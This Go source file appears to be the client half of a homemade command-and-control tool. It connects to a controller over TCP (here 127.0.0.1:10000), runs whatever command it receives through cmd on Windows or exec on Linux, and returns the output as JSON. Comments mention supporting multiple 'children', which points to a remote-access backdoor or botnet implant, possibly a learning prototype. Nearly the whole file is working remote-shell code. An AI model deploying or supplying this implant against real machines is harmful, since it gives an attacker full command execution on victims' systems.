package main

// to build into an executable use:
// go build -o client.exe .\client_cmd.go
import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
)

type Results struct {
	ID int
	//Command string
	Output string
}

func OSCheck() string {
	var OSShell string
	if runtime.GOOS == "windows" {
		// fmt.Println("OS identified as Windows")
		//command =
		OSShell = "windows"
		// err := ni

	} else if runtime.GOOS == "linux" {
		// fmt.Println("OS identified as: Linux")
		OSShell = "linux"

	}
	return OSShell

}

func main() {

	// UNCOMMENT TO ASSIGN HOST AND PORT MANUALLY
	/* arguments := os.Args
	// if len(arguments) == 1 {
	// 	fmt.Println("Please provide host:port.")
	// 	return
	// } */
	for {
		// Connecting to host on port 10000- to be changed once ARP functionality is added
		CONNECT := "127.0.0.1:10000"
		c, err := net.Dial("tcp", CONNECT)
		if err != nil {
			fmt.Println(err)
			return
		}
		// place holder for results
		var results string

		//Read in command to be executed
		commandString, _ := bufio.NewReader(c).ReadString('\n')
		fmt.Print("Command Received->: " + commandString)
		if strings.TrimSpace(string(commandString)) == "STOP" {
			fmt.Println("TCP client exiting...")
			return
		}
		// Check the OS to execute command correctly
		checkOS := OSCheck()
		// IF clause for executing correctly
		if checkOS == "windows" {
			CommandExec, err := exec.Command("cmd", "/C", commandString).Output()
			if err != nil {
				fmt.Println("Error executing command")
				// c.Write([]byte("unable to execute command")) // maybe need to move into JSON format
				results = "unable to execute command"
				//don't quit program if unable to execute

			}
			fmt.Println("TEST")
			CommandExec2 := string(CommandExec)
			// results = strings.TrimSpace(CommandExec2)
			// fmt.Println(reflect.TypeOf(CommandExec))
			// fmt.Println(reflect.TypeOf(err))
			if CommandExec2 == "" {
				results = "unable to execute command"
			} else {
				results = strings.TrimSpace(CommandExec2)
			}

		} else if checkOS == "linux" {
			// fmt.Println("LINUX")
			//fmt.Println("XS", command)
			CommandExec, err := exec.Command(strings.TrimSpace(commandString)).Output()
			if err != nil {
				fmt.Println("Error executing command", err)
				// c.Write([]byte("unable to execute command"))
				results = "unable to execute command"
				// do not execute program if unable to execute command

			}
			fmt.Println("TEST")
			CommandExec2 := string(CommandExec)
			if CommandExec2 == "" {
				results = "unable to execute command"
			} else {
				results = strings.TrimSpace(CommandExec2)
			}
			// need for commands on linux - remove \r\n
		}

		//using the Results structure
		outputTest := &Results{
			ID:     1, // TODO: need to make this random for multiple children
			Output: results,
		}
		//encoding and decoding section
		//typing encoder to connection c
		encoder := json.NewEncoder(c)
		//encoder sending outputTest through c
		encoder.Encode(outputTest)
		//decoding to screen for debugging
		decoder := json.NewDecoder(c)
		decoder.Decode(&outputTest)
		fmt.Println("Encoded format:", outputTest)
		//closing connection
		c.Close()

	}
}
